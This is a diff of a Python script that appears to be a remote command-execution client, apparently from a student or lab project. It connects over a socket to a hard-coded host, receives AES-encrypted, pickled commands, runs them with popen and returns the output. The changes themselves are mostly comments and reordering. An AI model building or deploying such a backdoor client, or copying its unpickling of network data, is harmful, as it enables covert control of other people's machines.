@@ -10,25 +10,27 @@ from Crypto.Cipher import AES
 #TODO
 
 
-socket = socket.socket()
 HVA = '145.109.148.241'
 l = 'localhost'
+socket = socket.socket()
 serverAddress = l, 1111
 
 global key
 key = []
 
-
+#   --> Encrypt function, message is the payload to be encrypted, key is a list of keys
 def encryptAES(message, key):
     obj = AES.new(key[0][0], AES.MODE_CFB, key[0][1])
     ciphertext = obj.encrypt(message)
     return ciphertext
 
 
+#   --> Decrypt function, ciphertext is the encrypted text, key is a list of keys
 def decryptAES(ciphertext, key):
     obj2 = AES.new(key[0][0], AES.MODE_CFB, key[0][1])
     message = obj2.decrypt(ciphertext)
     return message
+
 
 #   --> Execute a command and return the result of it
 def popenExecution(data):
@@ -43,10 +45,9 @@ def send(socket, payload):
         payload = pickle.dumps(payload)
         payload = encryptAES(payload, key)
         socket.send(payload)
-        #socket.send(pickle.dumps(encryptAES(payload, key))) #Serialize --> encrypt --> send
     except Exception as e:
         print(e)
-        time.sleep(1)
+
 
 #   --> Receives a command, deserializes into a decryption, into a execution. Sends the output of that back
 def receive(socket):
@@ -59,6 +60,7 @@ def receive(socket):
 
     except Exception as e:
         print(e)
+
 
 def main():
 
